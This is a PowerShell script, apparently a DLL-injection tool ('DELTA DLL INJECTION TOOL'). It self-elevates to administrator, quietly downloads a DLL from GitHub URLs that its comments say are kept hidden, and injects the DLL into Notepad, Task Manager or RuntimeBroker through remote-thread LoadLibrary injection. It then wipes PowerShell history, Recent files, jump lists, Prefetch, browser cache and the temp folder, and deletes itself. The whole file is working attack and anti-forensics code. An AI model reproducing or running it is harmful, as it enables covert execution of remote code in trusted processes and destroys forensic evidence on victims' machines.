# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-NoExit",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# === Fixed LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === 1. Clear Temp Folder ===
Write-Host "[+] Preparing environment..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}
catch {
    # Silent fail
}

# === 2. Download DLL to %TEMP% ===
$randomGuid = [System.Guid]::NewGuid().ToString()
$dllFileName = "$randomGuid.dll"
$dllPath = Join-Path $env:TEMP $dllFileName

# URL ที่จะใช้ (ไม่แสดงให้ผู้ใช้เห็น)
$urls = @(
    "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll",
    "https://raw.githubusercontent.com/novaxstorex/delta/main/delta.dll?raw=true",
    "https://github.com/novaxstorex/delta/raw/main/delta.dll",
    "https://raw.githubusercontent.com/novaxstorex/delta/main/Delta.dll",
    "https://raw.githubusercontent.com/novaxstorex/delta/main/DELTA.dll"
)

Write-Host "[+] Downloading delta.dll..." -ForegroundColor Cyan

$downloaded = $false

# ลองดาวน์โหลดแบบเงียบๆ ไม่แสดง URL
foreach ($url in $urls) {
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        
        $webClient.DownloadFile($url, $dllPath)
        $webClient.Dispose()
        
        if (Test-Path $dllPath) {
            $fileSize = (Get-Item $dllPath).Length
            if ($fileSize -gt 0) {
                $downloaded = $true
                break
            } else {
                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    catch {
        if (Test-Path $dllPath) {
            Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
        }
        continue
    }
}

# ถ้ายังไม่ได้ดาวน์โหลด ลองวิธีอื่นแบบเงียบๆ
if (-not $downloaded) {
    foreach ($url in $urls) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction SilentlyContinue
            
            if ((Test-Path $dllPath) -and ((Get-Item $dllPath).Length -gt 0)) {
                $downloaded = $true
                break
            }
        }
        catch {
            if (Test-Path $dllPath) {
                Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
            }
            continue
        }
    }
}

# ถ้ายังดาวน์โหลดไม่ได้ ให้ใช้ DLL ที่มีในเครื่อง
if (-not $downloaded) {
    # ตรวจสอบว่า delta.dll มีอยู่ในเครื่องหรือไม่
    $localDllPaths = @(
        ".\delta.dll",
        "$env:TEMP\delta.dll",
        "$env:USERPROFILE\Desktop\delta.dll",
        "$env:USERPROFILE\Downloads\delta.dll"
    )
    
    $foundLocal = $false
    foreach ($localPath in $localDllPaths) {
        if (Test-Path $localPath) {
            try {
                Copy-Item $localPath $dllPath -Force
                if ((Get-Item $dllPath).Length -gt 0) {
                    Write-Host "[+] Using local delta.dll" -ForegroundColor Green
                    $downloaded = $true
                    $foundLocal = $true
                    break
                }
            }
            catch {
                continue
            }
        }
    }
    
    # ถ้ายังไม่มีให้สร้างไฟล์ dummy (แต่จะไม่ทำงาน)
    if (-not $downloaded) {
        Write-Host "[!] Warning: Could not download delta.dll" -ForegroundColor Yellow
        Write-Host "[!] The injection may fail. Continuing anyway..." -ForegroundColor Yellow
        # สร้างไฟล์เปล่าเพื่อไม่ให้ Script ผิดพลาด
        New-Item -ItemType File -Path $dllPath -Force | Out-Null
    }
}

# ตรวจสอบไฟล์ DLL (แบบไม่แสดงผลมาก)
if (Test-Path $dllPath) {
    $fileSize = (Get-Item $dllPath).Length
    if ($fileSize -gt 0) {
        Write-Host "[+] DLL ready ($([math]::Round($fileSize/1KB, 2)) KB)" -ForegroundColor Green
    } else {
        Write-Host "[!] Warning: DLL file is empty" -ForegroundColor Yellow
    }
}

# === Process Selection Menu (Interactive) ===
Clear-Host
Write-Host "╔════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         DELTA DLL INJECTION TOOL               ║" -ForegroundColor Yellow
Write-Host "╚════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Select target process for injection:" -ForegroundColor White
Write-Host ""
Write-Host "    [1] Notepad" -ForegroundColor Green
Write-Host "    [2] Task Manager (Taskmgr)" -ForegroundColor Green
Write-Host "    [3] RuntimeBroker" -ForegroundColor Green
Write-Host ""
Write-Host "╔════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host ""

$proc = $null
$targetProcess = ""
$targetExe = ""
$validChoice = $false

do {
    Write-Host ""
    $choice = Read-Host "  Enter choice (1-3)"
    Write-Host ""
    
    switch ($choice) {
        "1" {
            $targetProcess = "notepad"
            $targetExe = "notepad.exe"
            
            try {
                $existingProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "  [+] Found existing Notepad.exe (PID: $($existingProc.Id))" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "  [+] Starting Notepad.exe..." -ForegroundColor Cyan
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                }
                $validChoice = $true
            }
            catch {
                Write-Host "  [!] Failed to start Notepad.exe: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        "2" {
            $targetProcess = "Taskmgr"
            $targetExe = "taskmgr.exe"
            
            try {
                $existingProc = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($existingProc) {
                    Write-Host "  [+] Found existing Task Manager (PID: $($existingProc.Id))" -ForegroundColor Green
                    $proc = $existingProc
                } else {
                    Write-Host "  [+] Starting Task Manager..." -ForegroundColor Cyan
                    $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 3
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                }
                $validChoice = $true
            }
            catch {
                Write-Host "  [!] Failed to start Task Manager: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        "3" {
            $targetProcess = "RuntimeBroker"
            $targetExe = "RuntimeBroker.exe"
            
            try {
                $proc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($proc) {
                    Write-Host "  [+] Found RuntimeBroker.exe (PID: $($proc.Id))" -ForegroundColor Green
                    $validChoice = $true
                } else {
                    Write-Host "  [!] RuntimeBroker not found. Using Notepad as fallback..." -ForegroundColor Yellow
                    $targetProcess = "notepad"
                    $targetExe = "notepad.exe"
                    $proc = Start-Process -FilePath "notepad.exe" -WindowStyle Normal -PassThru -ErrorAction Stop
                    Start-Sleep -Seconds 2
                    $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
                    $validChoice = $true
                }
            }
            catch {
                Write-Host "  [!] Failed to find RuntimeBroker: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        default {
            Write-Host "  [!] Invalid choice. Please enter 1, 2, or 3." -ForegroundColor Red
        }
    }
    
    if (-not $validChoice) {
        Write-Host "  [!] Failed to get a valid process." -ForegroundColor Red
        Write-Host "  Press any key to try again..." -ForegroundColor Yellow
        Read-Host
        Clear-Host
        Write-Host "╔══════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host "║         DELTA DLL INJECTION TOOL             ║" -ForegroundColor Yellow
        Write-Host "╚══════════════════════════════════════════════╝" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  Select target process for injection:" -ForegroundColor White
        Write-Host ""
        Write-Host "    [1] Notepad" -ForegroundColor Green
        Write-Host "    [2] Task Manager (Taskmgr)" -ForegroundColor Green
        Write-Host "    [3] RuntimeBroker" -ForegroundColor Green
        Write-Host ""
        Write-Host "╔══════════════════════════════════════════════╗" -ForegroundColor Cyan
        Write-Host ""
    }
} while (-not $validChoice -or -not $proc)

# ตรวจสอบ process
if (-not $proc) {
    Write-Host "  [!] No target process available. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

try {
    $proc = Get-Process -Id $proc.Id -ErrorAction Stop
} catch {
    Write-Host "  [!] Process died or is no longer accessible. Exiting..." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

$pid1 = $proc.Id
Write-Host ""
Write-Host "╔════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  [+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green
Write-Host "  [+] Injecting: delta.dll" -ForegroundColor Green
Write-Host "╚════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""

# === Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    Write-Host "  [+] Opening process handle..." -ForegroundColor Cyan
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "  [!] Failed to open process handle. Access Denied?" -ForegroundColor Red
        Write-Host "  [!] Trying with limited permissions..." -ForegroundColor Yellow
        $hProcess = $OpenProcessDelegate.Invoke(0x002A, 0, $pid1)
        
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "  [!] Still failed to open process handle" -ForegroundColor Red
            Read-Host "Press Enter to exit"
            exit 1
        }
    }
    Write-Host "  [+] Process Handle: $hProcess" -ForegroundColor Green
    
    Write-Host "  [+] Allocating memory in target process..." -ForegroundColor Cyan
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "  [!] Failed to allocate memory" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "  [+] Allocated Memory: $addr" -ForegroundColor Green
    
    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    
    Write-Host "  [+] Writing DLL path to target process..." -ForegroundColor Cyan
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    
    if (-not $res) {
        Write-Host "  [!] Failed to write memory" -ForegroundColor Red
        Read-Host "Press Enter to exit"
        exit 1
    }
    Write-Host "  [+] Memory Written: $res" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "  [+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
    
    Write-Host "  [+] Creating remote thread to load delta.dll..." -ForegroundColor Cyan
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host ""
        Write-Host "╔════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║         [✓] INJECTION SUCCESSFUL!              ║" -ForegroundColor Green
        Write-Host "╠════════════════════════════════════════════════╣" -ForegroundColor Green
        Write-Host "║  Thread Handle: $hThread" -ForegroundColor Green
        Write-Host "║  delta.dll loaded into $targetProcess (PID: $pid1)" -ForegroundColor Green
        Write-Host "║  Delta DLL is now running in target process    ║" -ForegroundColor Green
        Write-Host "╚════════════════════════════════════════════════╝" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "  [!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
        Write-Host "  [!] Try selecting a different process." -ForegroundColor Yellow
    }
}
catch {
    Write-Host "  [!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
}

# === Enhanced Cleanup & Anti-Forensics ===
Write-Host ""
Write-Host "  [+] Starting cleanup..." -ForegroundColor Cyan

# Clear PowerShell History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# Clear Prefetch
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# Clear INetCache
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# Clear Temp Folder
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# Delete DLL
Start-Sleep -Seconds 1
if (Test-Path $dllPath) { 
    try { 
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
    } catch {
        # Silent fail
    }
}

# Delete script
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    try {
        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
    } catch {
        # Silent fail
    }
}

[GC]::Collect()
[GC]::WaitForPendingFinalizers()
Start-Sleep -Seconds 2

Write-Host "  [+] Cleanup complete" -ForegroundColor Green
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host
exit
